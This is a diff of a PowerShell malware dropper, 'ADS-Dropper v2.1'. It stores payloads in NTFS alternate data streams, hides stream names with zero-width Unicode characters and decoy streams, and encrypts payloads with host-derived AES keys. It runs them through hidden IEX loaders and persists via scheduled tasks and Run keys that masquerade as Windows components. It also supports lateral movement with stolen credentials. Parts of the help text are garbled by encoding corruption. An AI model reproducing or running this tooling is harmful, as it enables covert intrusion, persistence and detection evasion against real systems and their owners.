@@ -142,20 +142,39 @@ Unauthorized use is illegal and unethical.
 
 [CmdletBinding()]
 param(
-    [Parameter(Mandatory=$false)][object]$Payload,
+    [Parameter(Mandatory=$false)]
+    [string]$Payload,
+    
+    [switch]$PayloadAtRuntime,
     [string[]]$Targets = @('localhost'),
-    [string[]]$Persist = @('task'),
+    
+    [ValidateSet('task', 'registry', 'wmi', 'none')]
+    [string]$Persist = 'task',
+    
     [switch]$Randomize,
     [switch]$Encrypt,
+    [switch]$ZeroWidthStreams,
+    
+    [ValidateSet('single', 'multi', 'hybrid')]
+    [string]$ZeroWidthMode = 'single',
+    
+    [string]$HybridPrefix,
+    
+    [ValidateRange(0, 10)]
+    [int]$CreateDecoys = 0,
+    
+    [string]$ManifestPath,
     [switch]$NoExec,
     [PSCredential]$Credential,
-    [switch]$Help
+    [switch]$Help,
+    
+    [switch]$GenerateOnly
 )
 
 # Help display function
 function Show-Help {
     $helpText = @"
-╔══════════════════════════════════════════════════════════════════════════╗ ║ ADS-Dropper v2.1 - Quick Reference ║ ╚══════════════════════════════════════════════════════════════════════════╝
+â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•— â•‘ ADS-Dropper v2.1 - Quick Reference â•‘ â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 USAGE: .\ADS-Dropper.ps1 -Payload <string|file> [OPTIONS]
 REQUIRED: -Payload <string|array> Payload to deploy (command or @('file.ps1'))
 OPTIONAL: -Targets <array> Target hosts (default: @('localhost')) -Persist <array> Persistence methods: task, reg, volroot -Randomize Randomize artifacts for evasion -Encrypt AES-256 encrypt payload -NoExec Stage without executing -Credential <PSCredential> Creds for remote deployment
@@ -167,11 +186,11 @@ Full stealth (RECOMMENDED)
 Multiple persistence methods
 .\ADS-Dropper.ps1 -Payload `$payload -Persist @('task','reg')
 Lateral movement
-$cred = Get-Credential .\ADS-Dropper.ps1 -Payload payload−Targets@(′dc01′)−Credential‘payload -Targets @('dc01') -Credential ` payload−Targets@(′dc01′)−Credential
+$cred = Get-Credential .\ADS-Dropper.ps1 -Payload payloadâˆ’Targets@(â€²dc01â€²)âˆ’Credentialâ€˜payload -Targets @('dc01') -Credential ` payloadâˆ’Targets@(â€²dc01â€²)âˆ’Credential
 PERSISTENCE METHODS:
-task Scheduled Task (admin required) └─ Triggers: Logon + periodic (every 5 min) └─ Path: \Microsoft\Windows\UX* or ...\UsbCeip
-reg Registry Run Key (user or admin) └─ HKCU/HKLM:...\CurrentVersion\Run └─ Fallback if not admin
-volroot Volume Root ADS (admin required, NOVEL) └─ Stores command in C::ads_* └─ No parent file, survives directory wipes
+task Scheduled Task (admin required) â””â”€ Triggers: Logon + periodic (every 5 min) â””â”€ Path: \Microsoft\Windows\UX* or ...\UsbCeip
+reg Registry Run Key (user or admin) â””â”€ HKCU/HKLM:...\CurrentVersion\Run â””â”€ Fallback if not admin
+volroot Volume Root ADS (admin required, NOVEL) â””â”€ Stores command in C::ads_* â””â”€ No parent file, survives directory wipes
 ENCRYPTION:
 -Encrypt enables AES-256 with machine-specific key (UUID+hostname)
 Pros: Prevents static analysis, evades content-based detection Cons: Requires PowerShell loader (more telemetry than VBScript)
@@ -207,356 +226,560 @@ if ($Help -or $args -contains '-h' -or $args -contains '--help' -or
     exit 0
 }
 
-# Main Code
-if ($Targets -notcontains 'localhost' -and -not $Credential) {
-    throw "Remote targets require -Credential parameter"
-}
+# Main Execution Logic Begins
 
-$validPersistMethods = @('task', 'reg', 'volroot')
-foreach ($method in $Persist) {
-    if ($method -notin $validPersistMethods) {
-        throw "Invalid persistence method: $method. Valid options: $($validPersistMethods -join ', ')"
+#region Zero-Width Unicode Functions
+
+# Verified zero-width Unicode codepoints
+$script:ZeroWidthChars = @(
+    0x061C,  # Arabic Letter Mark
+    0x180E,  # Mongolian Vowel Separator
+    0x200B,  # Zero Width Space
+    0x200C,  # Zero Width Non-Joiner
+    0x200D,  # Zero Width Joiner
+    0x200E,  # Left-to-Right Mark
+    0x200F,  # Right-to-Left Mark
+    0x202A,  # LTR Embedding
+    0x202B,  # RTL Embedding
+    0x202C,  # Pop Directional
+    0x202D,  # LTR Override
+    0x202E,  # RTL Override
+    0x2060,  # Word Joiner
+    0xFEFF   # Zero Width No-Break Space
+)
+
+function Generate-ZeroWidthStream {
+    <#
+    .SYNOPSIS
+        Generates zero-width Unicode stream name
+    #>
+    [CmdletBinding()]
+    [OutputType([string])]
+    param(
+        [ValidateSet('single', 'multi', 'hybrid')]
+        [string]$Mode = 'single',
+
+        [string]$Prefix,
+
+        [ValidateRange(2, 5)]
+        [int]$Length = 3
+    )
+
+    try {
+        switch ($Mode) {
+            'single' {
+                $char = [char]($script:ZeroWidthChars | Get-Random)
+                return $char
+            }
+            
+            'multi' {
+                $chars = @()
+                for ($i = 0; $i -lt $Length; $i++) {
+                    $chars += [char]($script:ZeroWidthChars | Get-Random)
+                }
+                return -join $chars
+            }
+            
+            'hybrid' {
+                # Legitimate stream names
+                $legitNames = @('Zone.Identifier', 'Summary', 'Comments', 'Author')
+                
+                if ([string]::IsNullOrEmpty($Prefix)) {
+                    $Prefix = $legitNames | Get-Random
+                }
+                
+                $suffix = [char]($script:ZeroWidthChars | Get-Random)
+                return "$Prefix$suffix"
+            }
+        }
+    } catch {
+        Write-Verbose "Zero-width generation failed, using fallback"
+        return -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
     }
 }
 
-$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-Write-Host "Admin: $isAdmin | Encrypt: $Encrypt | Targets: $($Targets -join ', ') | Persist: $($Persist -join ', ')" -ForegroundColor Cyan
+function Get-ZeroWidthCodepoints {
+    <#
+    .SYNOPSIS
+        Returns Unicode codepoints for a stream name
+    #>
+    [CmdletBinding()]
+    param([string]$StreamName)
+
+    $chars = $StreamName.ToCharArray()
+    $codepoints = ($chars | ForEach-Object { "U+{0:X4}" -f [int]$_ }) -join ' '
+    $bytes = ([System.Text.Encoding]::Unicode.GetBytes($StreamName) | 
+              ForEach-Object { "0x{0:X2}" -f $_ }) -join ' '
+
+    return [PSCustomObject]@{
+        StreamName = $StreamName
+        Codepoints = $codepoints
+        ByteSequence = $bytes
+        CharCount = $chars.Length
+        ContainsZeroWidth = ($chars | Where-Object { 
+            $script:ZeroWidthChars -contains [int]$_ 
+        }).Count -gt 0
+    }
+}
+
+function ConvertFrom-Codepoints {
+    <#
+    .SYNOPSIS
+        Reconstructs stream name from codepoint string
+    #>
+    [CmdletBinding()]
+    param([string]$Codepoints)
+
+    try {
+        $points = $Codepoints -split '\s+' | ForEach-Object {
+            $cleaned = $_ -replace '^(U\+|0x)', ''
+            [int]"0x$cleaned"
+        }
+        return -join ($points | ForEach-Object { [char]$_ })
+    } catch {
+        Write-Error "Failed to reconstruct from codepoints: $_"
+        return $null
+    }
+}
+
+#endregion
+
+#region Manifest Functions (Linux-side only)
+
+function Create-ManifestEntry {
+    <#
+    .SYNOPSIS
+        Creates manifest entry for tracking (Linux operator machine)
+    #>
+    [CmdletBinding()]
+    param(
+        [string]$TargetHost,
+        [string]$FilePath,
+        [string]$StreamName,
+        [string]$PayloadHash,
+        [string]$PersistenceMethod
+    )
+
+    $info = Get-ZeroWidthCodepoints -StreamName $StreamName
+
+    return [PSCustomObject]@{
+        EntryId = [guid]::NewGuid().ToString()
+        Timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss UTC")
+        TargetHost = $TargetHost
+        FilePath = $FilePath
+        StreamName = $StreamName
+        Codepoints = $info.Codepoints
+        PayloadHash = $PayloadHash
+        PersistenceMethod = $PersistenceMethod
+        OperatorUsername = $env:USER
+        OperatorHostname = hostname
+    }
+}
+
+function Save-ManifestToLinux {
+    <#
+    .SYNOPSIS
+        Saves manifest to Linux operator machine (NOT Windows target)
+    #>
+    [CmdletBinding()]
+    param(
+        [PSCustomObject[]]$Entries,
+        [string]$OutputPath
+    )
+
+    try {
+        $json = $Entries | ConvertTo-Json -Depth 10
+        
+        if (-not (Test-Path (Split-Path $OutputPath))) {
+            New-Item -Path (Split-Path $OutputPath) -ItemType Directory -Force | Out-Null
+        }
+
+        $json | Out-File -FilePath $OutputPath -Encoding UTF8
+        Write-Verbose "Manifest saved to: $OutputPath"
+    } catch {
+        Write-Error "Failed to save manifest: $_"
+    }
+}
+
+#endregion
+
+#region Payload Encryption
+
+function Get-HostDerivedKey {
+    <#
+    .SYNOPSIS
+        Derives AES-256 key from target host properties
+    #>
+    try {
+        $hostInfo = @(
+            $env:COMPUTERNAME
+            (Get-WmiObject Win32_ComputerSystemProduct -ErrorAction SilentlyContinue).UUID
+            (Get-WmiObject Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber
+        ) -join '|'
+
+        $sha256 = [System.Security.Cryptography.SHA256]::Create()
+        return $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hostInfo))
+    } catch {
+        Write-Warning "Host key derivation failed, using fallback"
+        return [System.Text.Encoding]::UTF8.GetBytes('ADS-Fallback-Key-32-Bytes-Long!')
+    }
+}
+
+function Protect-Payload {
+    <#
+    .SYNOPSIS
+        Encrypts payload with AES-256
+    #>
+    param([string]$PlainText, [byte[]]$Key)
+
+    $aes = [System.Security.Cryptography.Aes]::Create()
+    $aes.Key = $Key
+    $aes.GenerateIV()
+
+    $encryptor = $aes.CreateEncryptor()
+    $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
+    $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
+
+    $result = $aes.IV + $encryptedBytes
+    return [Convert]::ToBase64String($result)
+}
+
+function Unprotect-Payload {
+    <#
+    .SYNOPSIS
+        Decrypts payload with AES-256
+    #>
+    param([string]$EncryptedData, [byte[]]$Key)
+
+    $encryptedBytes = [Convert]::FromBase64String($EncryptedData)
+
+    $aes = [System.Security.Cryptography.Aes]::Create()
+    $aes.Key = $Key
+    
+    $iv = $encryptedBytes[0..15]
+    $ciphertext = $encryptedBytes[16..($encryptedBytes.Length - 1)]
+    
+    $aes.IV = $iv
+    $decryptor = $aes.CreateDecryptor()
+    
+    $plainBytes = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
+    return [System.Text.Encoding]::UTF8.GetString($plainBytes)
+}
+
+#endregion
+
+#region ADS Operations
 
 function Get-RandomADSConfig {
-    $adj = @('Sys','Kernel','Cache','Log','Data','Temp','Boot','User')
-    $noun = @('Mgr','Svc','Util','Chk','Idx','Core','Stream','Host')
-    $exts = @('.dat','.log','.idx','.tmp','.chk')
-    
-    # Calculate AES key
-    $seed = (Get-CimInstance Win32_ComputerSystemProduct).UUID + $env:COMPUTERNAME
-    $sha256 = [System.Security.Cryptography.SHA256]::Create()
-    $keyBytes = $sha256.ComputeHash([Text.Encoding]::UTF8.GetBytes($seed))
-    
-    # Stream name options (WITH colon prefix)
-    $legitimateStreams = @(':Zone.Identifier', ':SmartScreen', ':Catalog', ':appcompat.txt')
-    $randomStream = ':' + (-join (1..8 | ForEach-Object { [char](Get-Random -Minimum 97 -Maximum 122) }))
-    
-    # Return configuration hashtable
-    @{
-        HostPath = if($Randomize) { 
-            "C:\ProgramData\$(Get-Random -InputObject $adj)$(Get-Random -InputObject $noun)$(Get-Random -InputObject $exts)"
-        } else { 
-            'C:\ProgramData\SystemCache.dat' 
+    <#
+    .SYNOPSIS
+        Generates ADS configuration
+    #>
+    [CmdletBinding()]
+    param(
+        [switch]$UseZeroWidth,
+        [string]$ZwMode = 'single',
+        [string]$ZwPrefix
+    )
+
+    # Cross-platform path handling
+    # On Linux (config generation): use Windows default path
+    # On Windows (actual deployment): use actual %ProgramData%
+    if ($env:ProgramData) {
+        # Running on Windows - use Join-Path normally
+        $hostPath = if ($Randomize) {
+            Join-Path $env:ProgramData (-join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ }))
+        } else {
+            Join-Path $env:ProgramData "SystemCache.dat"
         }
-        
-        StreamName = if($Randomize) { 
-            Get-Random -InputObject ($legitimateStreams + $randomStream)
-        } else { 
-            ':syc_payload' 
+    } else {
+        # Running on Linux - manually construct Windows path (Join-Path won't work with C:\)
+        if ($Randomize) {
+            $randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
+            $hostPath = "C:\ProgramData\$randomName"
+        } else {
+            $hostPath = "C:\ProgramData\SystemCache.dat"
         }
-        
-        AESKey = [Convert]::ToBase64String($keyBytes)
-        
-        VBSPrefix = if($Randomize) { 
-            'app_log_' + (-join (1..6 | ForEach-Object { [char](Get-Random -Minimum 97 -Maximum 123) })) + '.'
-        } else { 
-            'app_log_a.' 
+    }
+   
+    $streamName = if ($UseZeroWidth) {
+        Generate-ZeroWidthStream -Mode $ZwMode -Prefix $ZwPrefix
+    } else {
+        if ($Randomize) {
+            -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
+        } else {
+            'payload'
         }
+    }
+
+    return @{
+        HostPath = $hostPath
+        StreamName = $streamName
+        Codepoints = (Get-ZeroWidthCodepoints -StreamName $streamName).Codepoints
     }
 }
 
-function ConvertTo-PSPayload($PayloadObj) {
-    if($PayloadObj -is [string]) { 
-        return $PayloadObj 
-    }
-    
-    if($PayloadObj -is [array]) { 
-        $filePath = $PayloadObj[0]
-        if(-not (Test-Path $filePath)) {
-            throw "Payload file not found: $filePath"
-        }
+function Create-DecoyStreams {
+    <#
+    .SYNOPSIS
+        Creates benign decoy ADS
+    #>
+    [CmdletBinding()]
+    param([string]$HostPath, [int]$Count = 3)
 
+    if ($Count -le 0) { return }
+
+    $decoyNames = @(':Zone.Identifier', ':Summary', ':Comments', ':Author')
+    $benignContent = @(
+        "[ZoneTransfer]`r`nZoneId=3",
+        "Document summary information",
+        "Internal use only"
+    )
+
+    for ($i = 0; $i -lt [Math]::Min($Count, $decoyNames.Count); $i++) {
+        $content = $benignContent | Get-Random
         try {
-          $content = Get-Content $filePath -Raw -Encoding UTF8 -ErrorAction Stop
+            $content | Set-Content -Path "$HostPath$($decoyNames[$i])" -Force
+            Write-Verbose "Created decoy: $($decoyNames[$i])"
         } catch {
-            throw "Failed to interpret file as UTF8 - '$filePath': $_"
+            Write-Warning "Failed to create decoy $($decoyNames[$i]): $_"
         }
-        
-        # Try to detect if it's Base64-encoded (Imix stagers are often double-encoded)
-        try {
-            $decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($content))
-            # If successful and looks like PowerShell, return decoded
-            if($decoded -match '(IEX|Invoke-Expression|Import-Module|New-Object|Get-|Set-|Start-|function\s+\w+|\$\w+\s*=)') {
-                Write-Verbose "Detected Base64-encoded PowerShell, using decoded version"
-                return $decoded
-            }
-        } catch {
-            # Not Base64, return as-is
-        }
-        
-        return $content
     }
-    
-    return $PayloadObj.ToString()
 }
 
-function Protect-Payload($Payload, $KeyB64) {
-    $aes = [System.Security.Cryptography.Aes]::Create()
-    $aes.Key = [Convert]::FromBase64String($KeyB64)
-    $aes.IV = [byte[]](0..15)
-    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-    $enc = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($Payload), 0, $Payload.Length)
-    return [Convert]::ToBase64String($enc)
-}
+function Write-ADSPayload {
+    <#
+    .SYNOPSIS
+        Writes payload to ADS
+    #>
+    [CmdletBinding()]
+    param(
+        [string]$HostPath,
+        [string]$StreamName,
+        [string]$PayloadContent,
+        [switch]$EncryptPayload
+    )
 
-function New-ADSPayload($HostPath, $StreamName, $Payload, $Config) {
     try {
         # Ensure host file exists
-        if(!(Test-Path $HostPath)) { 
-            New-Item -Path $HostPath -ItemType File -Force -ErrorAction Stop | Out-Null
+        if (-not (Test-Path $HostPath)) {
+            New-Item -Path $HostPath -ItemType File -Force | Out-Null
         }
-        
-        # Prepare payload
-        $finalPayload = if($Encrypt) { 
-            Protect-Payload $Payload $Config.AESKey 
-        } else { 
-            # For VBScript loaders, Base64-encode the payload
-            $bytes = [Text.Encoding]::Unicode.GetBytes($Payload)
-            [Convert]::ToBase64String($bytes) 
+
+        # Encrypt if requested
+        $finalPayload = if ($EncryptPayload) {
+            $key = Get-HostDerivedKey
+            Protect-Payload -PlainText $PayloadContent -Key $key
+        } else {
+            $PayloadContent
         }
+
+        # Write to ADS
+        $adsPath = "$HostPath`:$StreamName"
+        $finalPayload | Set-Content -Path $adsPath -Force
         
-        $cleanStreamName = $StreamName.TrimStart(':')
-        $adsPath = "${HostPath}:${cleanStreamName}"
-        
-        # Write payload to ADS
-        Set-Content -Path $adsPath -Value $finalPayload -Encoding UTF8 -Force -ErrorAction Stop
-        
-        Write-Host "ADS Created: $adsPath" -ForegroundColor Green
+        Write-Verbose "Payload written to: $adsPath"
         return $adsPath
-        
     } catch {
-        Write-Error "Failed to create ADS: $_"
-        throw
+        Write-Error "Failed to write ADS: $_"
+        return $null
     }
 }
 
-function New-Loader($ADSPath, $Config) {
-    $loaderPath = (Split-Path $ADSPath) + '\' + $Config.VBSPrefix + 'vbs'
-    
-    if($Encrypt) {
-        Write-Warning "AES detected -> Using PowerShell loader"
-        return New-PSLoader $ADSPath $Config
-    }
-    
-    $vbsContent = @"
-On Error Resume Next
-Set shell = CreateObject("WScript.Shell")
-Set strm = CreateObject("ADODB.Stream")
-strm.Type = 2
-strm.Charset = "utf-8"
-strm.Open
-strm.LoadFromFile("$ADSPath")
-b64payload = strm.ReadText
-strm.Close
-cmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand " & b64payload
-shell.Run cmd, 0, False
+#endregion
+
+#region Persistence
+
+function Build-Loader {
+    <#
+    .SYNOPSIS
+        Generates PowerShell loader for ADS
+    #>
+    param(
+        [string]$HostPath,
+        [string]$StreamName,
+        [switch]$IsEncrypted
+    )
+
+    if ($IsEncrypted) {
+        return @"
+`$k = Get-HostDerivedKey
+`$e = Get-Content '$HostPath`:$StreamName' -Raw
+`$p = Unprotect-Payload -EncryptedData `$e -Key `$k
+IEX `$p
 "@
-
-    $vbsContent | Out-File $loaderPath -Encoding ASCII -Force
-    Write-Verbose "VBS Loader created: $loaderPath"
-    return $loaderPath
-}
-
-function New-PSLoader($ADSPath, $Config) {
-    $ps1Path = (Split-Path $ADSPath) + '\' + $Config.VBSPrefix + 'ps1'
-    
-    # Build decryption code conditionally
-    $decryptCode = if($Encrypt) {
-        @"
-`$aes = [System.Security.Cryptography.Aes]::Create()
-`$aes.Key = [Convert]::FromBase64String('$($Config.AESKey)')
-`$aes.IV = [byte[]](0..15)
-`$dec = `$aes.CreateDecryptor()
-`$encBytes = [Convert]::FromBase64String(`$payload)
-`$decBytes = `$dec.TransformFinalBlock(`$encBytes, 0, `$encBytes.Length)
-`$payload = [Text.Encoding]::UTF8.GetString(`$decBytes)
-"@
-    } else { "" }
-    
-    $loader = @"
-`$strm = New-Object IO.StreamReader("$ADSPath")
-`$payload = `$strm.ReadToEnd()
-`$strm.Close()
-$decryptCode
-Invoke-Expression `$payload
-"@
-    
-    $loader | Out-File $ps1Path -Encoding UTF8 -Force
-    return $ps1Path
-}
-
-function New-PersistenceMechanism($Type, $LoaderPath, $Config) {
-    $taskArgs = "//B `"$LoaderPath`""
-    
-    switch($Type) {
-        'task' {
-            if(!$isAdmin) { Write-Warning "Admin required for tasks"; return }
-            $taskName = if($Randomize) { "Microsoft\Windows\UX\$((New-Guid).Guid.Split('-')[0])" } 
-                       else { "Microsoft\Windows\Customer Experience Improvement Program\UsbCeip" }
-            & schtasks /create /tn $taskName /tr "wscript.exe $taskArgs" /sc onlogon /rl highest /f
-        }
-        'volroot' {
-            if(!$isAdmin) { Write-Warning "Admin required for volroot"; return }
-            
-            $rootADS = "C:\:ads_$((Get-Random -Minimum 1000 -Maximum 9999))"
-            
-            # Store EXECUTION COMMAND
-            if($LoaderPath.EndsWith('.vbs')) {
-                # For VBS: Store the wscript command
-                "wscript.exe //B `"$LoaderPath`"" | Set-Content -Path $rootADS -Force
-            } else {
-                # For PS1: Store the PowerShell source
-                Get-Content $LoaderPath -Raw | Set-Content -Path $rootADS -Force
-            }
-            
-            $taskName = "\Microsoft\Windows\Maintenance\WinSAT_$((Get-Random -Minimum 100 -Maximum 999))"
-            $action = "powershell.exe -WindowStyle Hidden -NoProfile -Command `"Get-Content '$rootADS' | Invoke-Expression`""
-           
-            & schtasks /create /tn $taskName /tr "$action" /sc onlogon /rl highest /f 2>&1 | Out-Null
-            
-            Write-Verbose "VolRoot ADS: $rootADS -> Task: $taskName"
-        }
-        'reg' {
-            $regPath = if($isAdmin) { 
-                "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" 
-            } else { 
-                "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" 
-            }
-            
-            $valueName = if($Randomize) { 
-                "Update_$((Get-Random -Minimum 1000 -Maximum 9999))" 
-            } else { 
-                "SystemUpdater" 
-            }
-            
-            if(-not (Test-Path $regPath)) {
-                New-Item -Path $regPath -Force | Out-Null
-            }
-            
-            Set-ItemProperty -Path $regPath -Name $valueName -Value "wscript.exe $taskArgs" -Force
-            Write-Host "Registry persistence: $regPath\$valueName" -ForegroundColor Yellow
-        }
-        default { Write-Warning "Unknown persistence: $Type" }
-    }
-    Write-Host "Persist [$Type] -> $LoaderPath" -ForegroundColor Yellow
-}
-
-function Invoke-RemoteDeployment($Target, $PayloadObj, $PersistList, $RandomizeFlag, $EncryptFlag, $NoExecFlag, $Cred) {
-    # Serialize each function as a string, separated by newlines
-    $allFunctions = @(
-        "function Get-RandomADSConfig { $( ${function:Get-RandomADSConfig}.ToString() ) }",
-        "function ConvertTo-PSPayload { $( ${function:ConvertTo-PSPayload}.ToString() ) }",
-        "function Protect-Payload { $( ${function:Protect-Payload}.ToString() ) }",
-        "function New-ADSPayload { $( ${function:New-ADSPayload}.ToString() ) }",
-        "function New-Loader { $( ${function:New-Loader}.ToString() ) }",
-        "function New-PSLoader { $( ${function:New-PSLoader}.ToString() ) }",
-        "function New-PersistenceMechanism { $( ${function:New-PersistenceMechanism}.ToString() ) }"
-    ) -join "`n`n"
-    
-    # Escape single quotes in payload for safe embedding
-    $payloadBytes = [Text.Encoding]::UTF8.GetBytes($PayloadObj)
-    $payloadB64 = [Convert]::ToBase64String($payloadBytes)
-
-    $persistArray = $PersistList -join "','"
-    $remoteBlock = [scriptblock]::Create(@"
-`$ErrorActionPreference = 'SilentlyContinue'
-
-# Load all functions
-$allFunctions
-
-# Execute deployment
-`$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-`$Randomize = `$$RandomizeFlag
-`$Encrypt = `$$EncryptFlag
-`$NoExec = `$$NoExecFlag
-
-# Convert payload
-`$rawPayload = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$payloadB64'))
-
-# Create ADS and loader
-`$cfg = Get-RandomADSConfig
-`$adsPath = New-ADSPayload `$cfg.HostPath `$cfg.StreamName `$rawPayload `$cfg
-`$loaderPath = New-Loader `$adsPath `$cfg
-
-# Set persistence
-foreach(`$pType in @('$persistArray')) { 
-    New-PersistenceMechanism `$pType `$loaderPath `$cfg 
-}
-
-
-# Execute if requested
-if(-not `$NoExec) { 
-    if(`$loaderPath.EndsWith('.vbs')) { 
-        $psi = New-Object System.Diagnostics.ProcessStartInfo
-        $psi.FileName = "wscript.exe"
-        $psi.Arguments = "//B `"$loaderPath`""
-        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-        $psi.CreateNoWindow = $true
-        [System.Diagnostics.Process]::Start($psi) | Out-Null
-    } else { 
-        $psi = New-Object System.Diagnostics.ProcessStartInfo
-        $psi.FileName = "powershell.exe"
-        $psi.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$loaderPath`""
-        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-        $psi.CreateNoWindow = $true
-        [System.Diagnostics.Process]::Start($psi) | Out-Null
-    }
-}
-
-return @{ Success = `$true; Artifacts = @{ ADS = `$adsPath; Loader = `$loaderPath } }
-"@)
-    
-    try {
-        $result = Invoke-Command -ComputerName $Target -Credential $Cred -ScriptBlock $remoteBlock -ErrorAction Stop
-        Write-Host "Remote deployment to $Target succeeded" -ForegroundColor Green
-        return $result
-    } catch {
-        Write-Error "Remote deployment to $Target failed: $_"
-        return @{ Success = $false; Error = $_.Exception.Message }
-    }
-}
-
-foreach($target in $Targets) {
-    if($target -eq 'localhost') {
-        # LOCAL DEPLOYMENT
-        $rawPayload = ConvertTo-PSPayload $Payload
-        $cfg = Get-RandomADSConfig
-        
-        $adsPath = New-ADSPayload $cfg.HostPath $cfg.StreamName $rawPayload $cfg
-        $loaderPath = New-Loader $adsPath $cfg
-        
-        foreach($pType in $Persist) { 
-            New-PersistenceMechanism $pType $loaderPath $cfg
-        }
-        
-        if(!$NoExec) { 
-            if($loaderPath.EndsWith('.vbs')) { 
-                $psi = New-Object System.Diagnostics.ProcessStartInfo
-                $psi.FileName = "wscript.exe"
-                $psi.Arguments = "//B `"$loaderPath`""
-                $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-                $psi.CreateNoWindow = $true
-                [System.Diagnostics.Process]::Start($psi) | Out-Null
-            } else { 
-                $psi = New-Object System.Diagnostics.ProcessStartInfo
-                $psi.FileName = "powershell.exe"
-                $psi.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$loaderPath`""
-                $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-                $psi.CreateNoWindow = $true
-                [System.Diagnostics.Process]::Start($psi) | Out-Null
-            }
-        }
-        Write-Host "Local deployment complete" -ForegroundColor Green
     } else {
-        # REMOTE DEPLOYMENT
-        Write-Host "-> Deploying to $target" -ForegroundColor Magenta
-        Invoke-RemoteDeployment $target $Payload $Persist $Randomize.IsPresent $Encrypt.IsPresent $NoExec.IsPresent $Credential
+        return @"
+`$p = Get-Content '$HostPath`:$StreamName' -Raw
+IEX `$p
+"@
     }
 }
 
-Write-Host "ADS-Dropper deployment complete!" -ForegroundColor Green
+function Create-ScheduledTaskPersistence {
+    <#
+    .SYNOPSIS
+        Creates scheduled task for persistence
+    #>
+    [CmdletBinding()]
+    param(
+        [string]$LoaderScript,
+        [string]$TaskName
+    )
+
+    try {
+        if ([string]::IsNullOrEmpty($TaskName)) {
+            $TaskName = if ($Randomize) {
+                "WinSAT_" + (-join ((65..90) | Get-Random -Count 6 | ForEach-Object { [char]$_ }))
+            } else {
+                "SystemOptimization"
+            }
+        }
+
+        # Save loader to temp
+        $loaderPath = "$env:TEMP\$([guid]::NewGuid().ToString().Substring(0,8)).ps1"
+        $LoaderScript | Out-File -FilePath $loaderPath -Encoding UTF8
+
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" `
+            -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$loaderPath`""
+        
+        $trigger = New-ScheduledTaskTrigger -AtLogOn
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
+        
+        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
+        
+        Write-Verbose "Scheduled task created: $TaskName"
+        return $TaskName
+    } catch {
+        Write-Error "Task creation failed: $_"
+        return $null
+    }
+}
+
+#endregion
+
+#region Main Execution
+
+# Handle payload input
+if ($PayloadAtRuntime -and -not $Payload) {
+    Write-Host "Enter payload (press Enter twice when done):" -ForegroundColor Cyan
+    $lines = @()
+    do {
+        $line = Read-Host
+        if ($line) { $lines += $line }
+    } while ($line)
+    $Payload = $lines -join "`n"
+}
+
+if (-not $Payload) {
+    Write-Error "No payload specified. Use -Payload or -PayloadAtRuntime"
+    exit 1
+}
+
+# Generate config
+$config = Get-RandomADSConfig -UseZeroWidth:$ZeroWidthStreams `
+                              -ZwMode $ZeroWidthMode `
+                              -ZwPrefix $HybridPrefix
+
+Write-Verbose "Host: $($config.HostPath)"
+Write-Verbose "Stream: $($config.StreamName)"
+if ($ZeroWidthStreams) {
+    Write-Warning "Zero-width stream - Codepoints: $($config.Codepoints)"
+}
+
+# Generate task name (for both GenerateOnly and normal execution)
+$taskName = if ($Randomize) {
+    "WinSAT_" + (-join ((65..90) | Get-Random -Count 6 | ForEach-Object { [char]$_ }))
+} else {
+    "SystemOptimization"
+}
+
+# If GenerateOnly mode, return configuration and exit
+if ($GenerateOnly) {
+    # Convert stream name to escaped format for command generation
+    $streamChars = $config.StreamName.ToCharArray()
+    $streamNameEscaped = ($streamChars | ForEach-Object {
+        "[char]0x{0:X4}" -f [int]$_
+    }) -join '+'
+    
+    # Return configuration object
+    return [PSCustomObject]@{
+        HostPath = $config.HostPath
+        StreamName = $config.StreamName
+        StreamNameEscaped = $streamNameEscaped
+        Codepoints = $config.Codepoints
+        TaskName = $taskName
+        Payload = $Payload
+        PayloadEncrypted = $Encrypt.IsPresent
